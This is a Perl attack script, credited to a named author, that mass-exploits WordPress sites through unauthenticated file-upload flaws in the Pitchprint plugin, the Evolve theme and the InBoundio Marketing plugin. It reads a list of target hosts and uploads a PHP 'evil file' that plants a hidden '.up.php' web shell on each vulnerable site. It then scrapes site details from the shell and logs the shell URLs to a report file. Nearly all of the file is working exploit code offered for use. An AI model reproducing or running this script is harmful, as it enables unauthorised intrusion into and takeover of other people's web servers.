#!/usr/bin/perl -w
# C0ded by Mr_AnarShi-T (M-A)
# (c) Zero-Way.NeY & Janissaries.org & Sec4ever.com
# GreeT's : All Friend Specially Rab3oun :)
use strict;
use LWP::UserAgent;
##
my @linkz;
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}

my $useragent = randomagent();#Get a Random User Agent 
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept
$ua->cookie_jar({});# Cookies
$ua->timeout(10);#Time out = 10 you can change it 
$ua->agent($useragent);#agent type
flag();
print "\n[+] Enter List Of Target : ";
chomp (my $list=<>);
my $file= "make.php";# Evil File
print "[+] Started : $datestring\n";
print "[+] Evil File : $file\n";
print "\n[.] Starting...\n";
GetLinkz();
print "[+] Quantity of Links:".scalar(@linkz)."\n";
print "[.] Begin work...\n";
Fuck();

sub flag {print "\n[+] Wordpress File Upload Exploiter \n[*] Coder => M-A\n\n";
}

sub Fuck {
    
    foreach my $web( @linkz ) {
    Exploiting ($web);
    }
}

sub Exploiting {
    my $link = $_[0];
    print "\n[Test] ".$link."\n\n";
    pitchprint($link);
    evolve ($link);
    inboundio ($link);    
}

sub GetLinkz {
        open( DOM, $list ) or die "$!\n";
        while( defined( my $line_ = <DOM> ) ) {
                chomp( $line_ );
                push( @linkz, $line_ );
        }
        close( DOM );
}

sub pitchprint {
    print "[Exploit] Pitchprint Plugin File Upload\n";
    my $url = "http://".$_[0]."/wp-content/plugins/pitchprint/uploader/";
    my $ss = "http://".$_[0]."/wp-content/plugins/pitchprint/uploader/files/".$file;
    my $response = $ua->get($url);
    if ($response->content=~/DELETE/ || $response->content=~/files/){
        print "[OK] Exploit Exists\n";
        print "[*] Sent payload\n";
        my $regex = 'files';
        my $body = $ua->post( $url,
        Content_Type => 'form-data',
        Content => [ 'files[]' => ["$file"] ]
        );
        if ($body->content!~/Filetype not allowed/){
            print "[+] Payload successfully executed\n";
            print "[*] Checking if shell was uploaded\n";
            my $res = $ua->get($ss);
            if ($res->is_success){
                my $y = $ss."?cmd=up";
                my $de = $ua->get($y);
                if ($de->content=~/OK/) {
                    print "[OK] Shell successfully Created \n";
                    my $hh = "http://".$_[0]."/wp-content/plugins/pitchprint/uploader/files/.up.php";
                    my $ee = $ua->get($hh);
                    print "\n[*] Website Info :\n";
                    print "| ".$hh."\n";
                    save ($hh);
                    if ($ee->content=~/<\/title><b><br><br>(.*?)<br><\/b>/) {
                        print "| $1 \n";
                        save ($1);
                        if ($ee->content=~/<br><\/b><b><br><br>(.*?)<br><br><\/b><form action=/) {
                            print "| $1\n\n";
                            save ($1);
                        } 
                    }
                }
            }
            else {print "[No] Can't Creat Shell \n\n";}
        }    
        else {print "[No] Can't Send Payload \n\n";}
    }
    else {print "[No] Exploit Not Found \n\n";}    
}

sub evolve {
    print "[Exploit] Evolve Theme File Upload\n";
    my $url = "http://".$_[0]."/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php";
    my $ss = "http://".$_[0]."/wp-content/uploads/$mon/$year/".$file;
    my $response = $ua->get($url);
    if ($response->content=~/No files were uploaded/ || $response->content=~/error/){
        print "[OK] Exploit Exists\n";
        print "[*] Sent payload\n";
        my $regex = 'success';
        my $body = $ua->post( $url,
        Content_Type => 'form-data',
        Content => [ 'qqfile' => ["$file"] ]
        );
        if ($body->content=~ /$regex/){
            print "[+] Payload successfully executed\n";
            print "[*] Checking if shell was uploaded\n\n";
            my $res = $ua->get($ss);
            if ($res->is_success){
                my $y = $ss."?cmd=up";
                my $de = $ua->get($y);
                if ($de->content=~/OK/) {
                    print "[OK] Shell successfully Created \n";
                    my $hh = "http://".$_[0]."/wp-content/uploads/$mon/$year/.up.php";
                    my $ee = $ua->get($hh);
                    print "\n[*] Website Info :\n";
                    print "| ".$hh."\n";
                    save ($hh);
                    if ($ee->content=~/<\/title><b><br><br>(.*?)<br><\/b>/) {
                        print "| $1 \n";
                        save ($1);
                        if ($ee->content=~/<br><\/b><b><br><br>(.*?)<br><br><\/b><form action=/) {
                            print "| $1\n\n";
                            save ($1);
                        } 
                    }
                }
            }
            else {print "[No] Can't Creat Shell \n\n";}
        }    
        else {print "[No] Can't Send Payload\n\n";}
    }
    else {print "[No] Exploit Not Found\n\n";}    
}

sub inboundio {
    print "[Exploit] WordPress Plugin InBoundio Marketing 1.0 File Upload\n";
    my $url = "http://".$_[0]."/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
    my $ss = "http://".$_[0]."/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/".$file;
    my $response = $ua->get($url);
    my $lengh = length($response->content);
    if ($lengh eq 0 || $response->is_success){
        print "[OK] Exploit Exists\n";
        print "[*] Sent payload\n";
        my $body = $ua->post( $url,
        Content_Type => 'form-data',
        Content => [ 'file' => ["$file"] ]
        );
        if ($body->content=~ /$_[0]/){
            print "[+] Payload successfully executed\n";
            print "[*] Checking if shell was uploaded\n\n";
            my $res = $ua->get($ss);
            if ($res->is_success){
                my $y = $ss."?cmd=up";
                my $de = $ua->get($y);
                if ($de->content=~/OK/) {
                    print "[OK] Shell successfully Created \n";
                    my $hh = "http://".$_[0]."/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/.up.php";
                    my $ee = $ua->get($hh);
                    print "\n[*] Website Info :\n";
                    print "| ".$hh."\n";
                    save ($hh);
                    if ($ee->content=~/<\/title><b><br><br>(.*?)<br><\/b>/) {
                        print "| $1 \n";
                        save ($1);
                        if ($ee->content=~/<br><\/b><b><br><br>(.*?)<br><br><\/b><form action=/) {
                            print "| $1\n\n";
                            save ($1);
                        } 
                    }
                }
            }
            else {print "[No] Can't Creat Shell \n\n";}
        }    
        else {print "[No] Can't Send Payload \n\n";}
    }
    else {print "[No] Exploit Not Found \n\n";}    
}

sub save {
open (XX,">>",'report.txt');
print XX $_[0]."\n";
close XX;
}
